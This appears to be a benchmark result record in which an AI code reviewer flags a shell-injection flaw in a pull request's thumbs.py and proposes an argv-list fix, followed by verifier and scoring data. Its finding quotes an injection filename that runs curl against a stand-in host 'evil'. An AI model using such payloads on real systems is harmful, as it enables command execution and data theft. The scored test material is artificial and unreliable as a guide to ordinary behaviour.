@@ -1,0 +1,95 @@
+{
+  "case": "C005",
+  "pr": "C005",
+  "repo": "fixture",
+  "provider": "grok",
+  "endpoint_kind": "xai",
+  "model": "grok-4.6",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "7695481624f1",
+  "turns": 4,
+  "tool_calls": null,
+  "seconds": 63.3,
+  "setup_seconds": 0.0,
+  "total_seconds": 63.3,
+  "usage": {
+    "in": 31467,
+    "cache_read": 87296,
+    "cache_write": 0,
+    "out": 3123,
+    "source": "cli"
+  },
+  "cost_usd": 0.12532,
+  "changed_files": [
+    "thumbs.py"
+  ],
+  "findings": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity": "critical",
+      "body": "Interpolating `upload_dir`, `name`, and `oid` into a `shell=True` command lets a crafted filename run arbitrary shell. A value such as `x.png; curl http://evil/$(id)` (or metacharacters in `oid` / `upload_dir`) executes as the convert user. ImageMagick 7 still reads policy.xml when spawned with an argv list; if the binary name changed, pass `['/usr/bin/magick', ...]` (or `/usr/bin/convert`) as a list and drop `shell=True`.\n\n```suggestion\n    subprocess.run(\n        [\"/usr/bin/convert\", f\"{upload_dir}/{name}\", f\"/srv/thumbs/{oid}.png\"],\n        check=True,\n    )\n```"
+    }
+  ],
+  "summary": "I'd recommend not merging until the shell-injection in `thumbs.py` is reverted to argv-list form. Switching `make_thumb` to `subprocess.run(..., shell=True)` with an f-string of `upload_dir`, `name`, and `oid` lets a crafted filename (or oid) execute as the convert user. ImageMagick 7 policy.xml still applies when convert is spawned with an argv list; if IM7 needs the `magick` binary, change only that path. **Recommendation:** request-changes",
+  "round": "full",
+  "effective_max_turns": 40,
+  "budget": {
+    "tier": "critical",
+    "profile": "auto",
+    "turns": 40,
+    "alias": "deep",
+    "model": "grok-4.6",
+    "output_tokens": 8192,
+    "verifier_warning_pct": 100,
+    "patch_bytes": 200000,
+    "native_cap_applied": true
+  },
+  "prior_finding_updates": {},
+  "prior_findings_kept": [],
+  "outstanding_verdicts": [],
+  "verification": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The head version of `make_thumb` runs `subprocess.run` with `shell=True` and an f-string that interpolates `upload_dir`, `name`, and `oid`, so shell metacharacters in those values execute as the convert user. Base used a safe argv list without `shell=True`; this is a real critical command-injection "
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 9.923,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 0,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 2400,
+      "out": 408
+    },
+    "cost_usd": 0.008195
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C005-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
